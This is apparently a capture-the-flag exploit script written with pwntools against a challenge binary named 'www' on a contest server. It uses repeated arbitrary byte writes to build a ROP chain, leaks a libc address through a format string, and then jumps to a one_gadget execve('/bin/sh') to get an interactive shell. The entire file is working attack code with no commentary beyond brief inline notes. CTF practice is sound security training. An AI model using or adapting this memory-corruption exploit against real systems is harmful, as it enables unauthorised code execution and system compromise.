#!/usr/bin/env python3
from pwn import *


def write_byte(io, where, what):
    io.sendline(f'{where} {chr(what)}')


if args.LOCAL:
    io = process(['./www'])
    gdb.attach(io, gdbscript='''
set pagination off
b *0x4006d7
commands
  p/x $rdx
  p/x $al
  c
end
b *0x400811
commands
  x/s $rdi
  c
end
b *0x400835
c
''')
else:
    io = remote('challenges1.hexionteam.com', 3002)
buf_offset = -0x25
amount_offset = -0x2c
ret_offset = 0x8
main = 0x400778
ret = 0x400835
marker = b'XXX'

# stage 1: set up looping and leak libc load address
rop = struct.pack('<QQ', ret, main)  # maintain 16-byte stack alignment
fmt = b'%30$p' + marker + b'\0'
write_byte(io, amount_offset - buf_offset, len(rop) + len(fmt))
for i, b in enumerate(rop):
    write_byte(io, ret_offset - buf_offset + i, b)
for i, b in enumerate(fmt):
    write_byte(io, i, b)
leak = io.recvuntil(marker)[:-len(marker)]
libc_addr = int(leak, 16) - 0x3e7638
print(f'libc_addr = 0x{libc_addr:016x}')
assert libc_addr & 0xfff == 0

# stage 2: jump to one_gadget
# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
rop = struct.pack('<QQ', ret, libc_addr + 0x4f322)
packed_null = struct.pack('<Q', 0)
write_byte(io, amount_offset - buf_offset, len(rop) + len(packed_null))
for i, b in enumerate(rop):
    write_byte(io, ret_offset - buf_offset + i, b)
for i, b in enumerate(packed_null):
    write_byte(io, ret_offset + 0x10 - buf_offset + 0x40 + i, b)

io.interactive()
